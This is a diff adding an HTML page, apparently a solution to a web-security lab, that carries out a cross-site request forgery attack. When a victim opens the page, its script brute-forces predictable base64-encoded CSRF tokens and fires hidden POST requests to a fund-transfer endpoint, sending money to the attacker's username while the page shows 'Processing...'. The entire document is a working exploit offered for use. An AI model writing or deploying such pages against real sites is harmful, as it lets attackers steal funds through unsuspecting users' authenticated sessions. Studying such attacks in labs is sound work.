@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Transferring Funds...</title>
+</head>
+<body>
+    <script>
+        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
+        const myUsername = "z5602057";
+        const amount = "100"; // 尝试转账金额
+
+        // 设定 Token 尝试范围 (基于观察到的 4958)
+        const start = 4958;
+        const range = 100; 
+
+        async function bruteForceCSRF() {
+            for (let i = start; i < start + range; i++) {
+                const token = btoa(i.toString()); 
+                
+                const formData = new URLSearchParams();
+                formData.append('username', myUsername);
+                formData.append('amount', amount);
+                formData.append('csrf_token', token);
+
+                fetch(targetUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                });
+            }
+        }
+
+        bruteForceCSRF();
+    </script>
+    <h2>Processing...</h2>
+</body>
+</html>
